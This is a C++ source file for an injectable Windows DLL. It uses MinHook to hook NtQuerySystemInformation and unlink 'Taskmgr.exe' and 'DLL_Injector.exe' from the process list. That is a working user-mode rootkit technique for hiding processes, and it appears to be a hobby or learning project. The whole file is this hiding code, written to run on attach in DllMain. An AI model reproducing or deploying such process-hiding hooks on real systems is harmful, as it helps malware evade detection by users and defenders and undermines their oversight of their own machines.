#include "..\include\MinHook.h"
#include "nt_structs.h"

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	//getting all the information from the original function to stat
	NTSTATUS stat = New_NtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	//checking if the struct SystemProcessInformation in the original and fake functions is the same and if stat is 0 
	if (SystemProcessInformation == SystemInformationClass && stat == 0)
	{
		//making two pointers of system information
		//the first
		P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
		//one after the first
		P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

		//going through the whole list
		while (prev->NextEntryOffset != NULL) 
		{
			//check if the current item in the list is the process of task manager
			if (lstrcmp(curr->ImageName.Buffer, L"Taskmgr.exe") == 0) 
			{
				//checks if the list is over
				if (curr->NextEntryOffset == 0) 
				{
					prev->NextEntryOffset = 0;		// if above process is at the end of the list
				}
				else 
				{
					//remove the task manager item
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
			//check if the current item in the list is the process of DLL_Injector
			if (lstrcmp(curr->ImageName.Buffer, L"DLL_Injector.exe") == 0) 
			{
				//checks if the list is over
				if (curr->NextEntryOffset == 0) 
				{
					prev->NextEntryOffset = 0;		// if above process is at the end of the list
				}
				else 
				{
					//remove the DLL_Injector item
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
			prev = curr;
			//next item in the list
			curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
		}
	}
	//return the modefied list
	return stat;
}

bool set_nt_hook()
{
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
	Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

	if (MH_Initialize() != MH_OK) 
	{ 
		return false; 
	}

	if(MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation, (LPVOID*) &New_NtQuerySystemInformation) != MH_OK) 
	{ 
		return false; 
	}

	if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) 
	{ 
		return false;  
	}
	return true; 
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch(fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		if (!set_nt_hook()) 
		{
			return FALSE;
		}
		break;
	case DLL_PROCESS_DETACH:
		MH_DisableHook(Original_NtQuerySystemInformation);
		MH_Uninitialize();
		break;
	}

	return TRUE;
}